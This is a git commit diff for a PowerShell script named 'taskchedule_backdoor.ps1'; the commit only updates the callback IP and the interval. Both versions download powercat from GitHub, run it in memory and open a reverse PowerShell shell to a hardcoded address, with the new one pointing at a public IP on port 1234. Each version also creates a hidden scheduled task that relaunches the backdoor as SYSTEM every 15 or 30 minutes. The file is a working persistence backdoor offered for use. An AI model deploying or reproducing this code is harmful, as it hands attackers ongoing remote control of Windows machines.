f0b10dc7fe58b38ef63e73d90224c5f27452ceb1
Vdtrung_ <hellovdtvip@gmail.com>
2022-05-30 20:55:03 +0700

    update ip

--- taskchedule_backdoor.ps1
+++ taskchedule_backdoor.ps1
@@ -1,2 +1,2 @@
-echo "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.199 -p 9001 -e powershell" > C:\ProgramData\Microsoft\Windows\backdoor.ps1
-schtasks /create /tn "backdoor" /tr "powershell -w 1 -ep bypass C:\ProgramData\Microsoft\Windows\backdoor.ps1" /rl highest /ru "NT AUTHORITY\SYSTEM" /sc MINUTE /MO 30
+echo "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 171.241.77.184 -p 1234 -e powershell" > C:\ProgramData\Microsoft\Windows\backdoor.ps1
+schtasks /create /tn "backdoor" /tr "powershell -w 1 -ep bypass C:\ProgramData\Microsoft\Windows\backdoor.ps1" /rl highest /ru "NT AUTHORITY\SYSTEM" /sc MINUTE /MO 15
